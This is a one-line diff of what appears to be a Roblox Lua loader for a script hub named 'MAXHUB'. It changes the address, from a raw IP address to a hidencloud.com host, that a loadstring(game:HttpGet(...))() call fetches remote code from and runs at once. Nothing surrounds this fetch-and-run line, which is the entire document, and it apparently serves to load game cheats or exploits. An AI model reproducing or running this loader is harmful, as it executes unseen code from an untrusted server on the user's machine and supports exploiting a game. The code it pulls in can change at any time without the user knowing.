@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://193.149.164.213:1044/maxnrzblox/MAXHUB/refs/heads/main/loader"))()
+loadstring(game:HttpGet("http://zac.hidencloud.com:24651/maxnrzblox/MAXHUB/refs/heads/main/loader"))()
